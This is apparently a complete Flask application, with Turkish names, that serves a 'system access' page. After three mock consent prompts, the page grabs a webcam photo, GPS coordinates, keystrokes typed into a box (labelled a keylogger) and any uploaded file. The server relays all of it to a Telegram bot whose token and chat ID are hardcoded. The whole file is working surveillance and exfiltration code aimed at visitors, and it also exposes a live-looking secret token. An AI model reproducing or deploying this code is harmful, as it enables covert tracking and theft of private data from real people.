from flask import Flask, request, jsonify
import requests
import os
import base64

app = Flask(__name__)

TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
CHAT_ID = "7622505128"
GIZLI_ANAHTAR = "Utkan_Super_Gizli_2024" 

def telegram_mesaj_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}, timeout=5)
    except: pass

def telegram_fotograf_gonder(fotograf_base64, bilgi_metni):
    try:
        resim_verisi = fotograf_base64.split(",")[1]
        resim_bytes = base64.b64decode(resim_verisi)
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        files = {'photo': ('ajan.jpg', resim_bytes)}
        data = {'chat_id': CHAT_ID, 'caption': bilgi_metni, 'parse_mode': 'HTML'}
        requests.post(url, files=files, data=data, timeout=15)
    except: pass

def telegram_dosya_gonder(dosya, dosya_adi, aciklama):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        files = {'document': (dosya_adi, dosya)}
        data = {'chat_id': CHAT_ID, 'caption': aciklama}
        requests.post(url, files=files, data=data, timeout=30)
    except: pass

@app.route('/', methods=['GET'])
def ana_sayfa():
    html = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Erişimi</title>
    <style>
        body { background-color: #0a0a0a; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .onay-kutusu { background: #111; border: 2px solid #0f0; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px #0f0; max-width: 80%; }
        h2 { color: #ff3333; }
        p { font-size: 16px; margin: 20px 0; }
        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; margin: 0 10px; cursor: pointer; font-family: monospace; font-size: 16px; border-radius: 5px; transition: 0.3s; }
        button:hover { background: #0f0; color: #000; }
        .gizli-alan { display: none; }
    </style>
    </head>
    <body>

    <div id="onay-ekrani" class="onay-kutusu">
        <h2 id="baslik">SİSTEM UYARISI</h2>
        <p id="mesaj">Bu siteye girmek üzeresiniz. Devam etmek istiyor musunuz?</p>
        <button id="btnEvet" onclick="onayAdimi()">TAMAM</button>
        <button id="btnHayir" onclick="reddet()">HAYIR</button>
    </div>

    <div id="sistem-alani" class="gizli-alan">
        <h2 style="color:red;">SİSTEM BAŞLATILIYOR...</h2>
        <p id="durum">Lütfen kamera ve konum izni verin...</p>
        <video id="video" autoplay muted playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <div style="margin-top:20px; border:1px dashed #0f0; padding:10px;">
            <h3>Belge Yükle</h3>
            <input type="file" id="dosyaSec" style="color:#0f0;">
        </div>

        <div style="margin-top:20px; border:1px dashed #0f0; padding:10px;">
            <h3>Mesaj Bırak</h3>
            <input type="text" id="gizliMetin" placeholder="Yazın..." style="width:80%; padding:10px; background:#000; color:#0f0; border:1px solid #0f0;">
        </div>
    </div>

    <script>
        let adim = 1;

        function onayAdimi() {
            const baslik = document.getElementById('baslik');
            const mesaj = document.getElementById('mesaj');
            const btnEvet = document.getElementById('btnEvet');

            if (adim === 1) {
                baslik.innerText = "DİKKAT!";
                mesaj.innerText = "Bu siteye izin verirsen IP adresin, konumun ve cihaz bilgilerin arka plandaki sunucuya geçecek. Emin misin?";
                btnEvet.innerText = "EVET, EMİNİM";
                adim++;
            } 
            else if (adim === 2) {
                baslik.innerText = "SON UYARI!";
                mesaj.innerText = "Bu işlem geri alınamaz. Kameran, mikrofonun ve konumun tamamen ele geçirilecek. Gerçekten emin misin?";
                btnEvet.innerText = "TAMAM, DEVAM ET";
                adim++;
            } 
            else if (adim === 3) {
                baslik.innerText = "SÖZLEŞME";
                mesaj.innerText = "Hiçbir şeyi kabul etmiyorum diyorsan 'HAYIR'a bas. Ama 'TAMAM' dersen tüm izinleri vermeyi kabul etmiş olursun.";
                btnEvet.innerText = "HEPSİNİ KABUL EDİYORUM";
                adim++;
            } 
            else {
                // 3. onaydan sonra sistemi başlat
                document.getElementById('onay-ekrani').style.display = 'none';
                document.getElementById('sistem-alani').style.display = 'block';
                izinleriIste();
            }
        }

        function reddet() {
            document.getElementById('onay-ekrani').innerHTML = "<h2 style='color:red;'>SİSTEMDEN ÇIKILIYOR...</h2><p>Güvenliğiniz için işlem iptal edildi.</p>";
        }

        async function izinleriIste() {
            const durum = document.getElementById('durum');
            try {
                // 1. KAMERA
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const foto = canvas.toDataURL('image/jpeg');
                    
                    fetch('/kamera', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'X-Secret-Key': 'Utkan_Super_Gizli_2024' },
                        body: JSON.stringify({ image: foto, ip: "Test" })
                    });
                    durum.innerHTML = "Kamera açıldı. Konum alınıyor...";
                };

                // 2. GPS KONUM
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            fetch('/konum', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json', 'X-Secret-Key': 'Utkan_Super_Gizli_2024' },
                                body: JSON.stringify({ lat: position.coords.latitude, lon: position.coords.longitude })
                            });
                            durum.innerHTML = "Konum alındı. Sistem dinlemede...";
                        },
                        (error) => { durum.innerHTML = "Konum izni reddedildi."; }
                    );
                }

                // 3. KLAVYE (KEYLOGGER)
                let yazilanlar = "";
                document.getElementById('gizliMetin').addEventListener('keyup', function(e) {
                    yazilanlar += e.key;
                    if (yazilanlar.length >= 5 || e.key === 'Enter') {
                        fetch('/keylog', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json', 'X-Secret-Key': 'Utkan_Super_Gizli_2024' },
                            body: JSON.stringify({ text: yazilanlar })
                        });
                        yazilanlar = ""; 
                    }
                });

                // 4. DOSYA
                document.getElementById('dosyaSec').addEventListener('change', function(e) {
                    const file = e.target.files[0];
                    if (file) {
                        const formData = new FormData();
                        formData.append('dosya', file);
                        fetch('/dosya', {
                            method: 'POST',
                            headers: { 'X-Secret-Key': 'Utkan_Super_Gizli_2024' },
                            body: formData
                        });
                    }
                });

            } catch (error) {
                durum.innerHTML = "İzinler reddedildi. Sistem kilitlendi.";
            }
        }
    </script>
    </body>
    </html>
    """
    return html

@app.route('/konum', methods=['POST'])
def konum():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    veri = request.json
    maps_link = f"https://www.google.com/maps?q={veri['lat']},{veri['lon']}"
    telegram_mesaj_gonder(f"📍 <b>NET GPS KONUMU ALINDI!</b>\n\n🗺️ <a href='{maps_link}'>Haritada Görüntüle</a>")
    return "OK", 200

@app.route('/keylog', methods=['POST'])
def keylog():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    veri = request.json
    telegram_mesaj_gonder(f"⌨️ <b>KLAVYE GİRDİSİ:</b>\n<code>{veri['text']}</code>")
    return "OK", 200

@app.route('/dosya', methods=['POST'])
def dosya():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    if 'dosya' not in request.files: return "Hata", 400
    dosya = request.files['dosya']
    telegram_dosya_gonder(dosya, dosya.filename, "📁 <b>DOSYA YÜKLENDİ!</b>")
    return "OK", 200

@app.route('/kamera', methods=['POST'])
def kamera():
    if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
    veri = request.json
    telegram_fotograf_gonder(veri['image'], "🚨 <b>AJAN YAKALANDI!</b>")
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
